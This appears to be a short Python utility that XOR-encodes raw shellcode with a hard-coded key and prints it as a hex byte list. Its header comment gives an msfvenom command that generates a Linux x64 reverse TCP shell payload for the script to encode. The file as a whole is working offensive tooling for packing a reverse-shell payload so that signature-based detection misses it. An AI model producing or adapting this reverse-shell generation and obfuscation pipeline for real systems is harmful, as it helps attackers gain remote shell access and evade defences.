# The shellcode we want to encode
# generate your raw shellcode say msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw > shellcode.bin

import sys

# The secret key used for encryption
key = b"\x04\x08\x09\x03\x04"

with open(sys.argv[1], "rb") as file:
    buf = file.read()

# xor the shellcode
result = bytes(buf[i] ^ key[i % len(key)] for i in range(len(buf)))
hex_string = ", ".join(f"0x{b:02X}" for b in result)
print(hex_string)
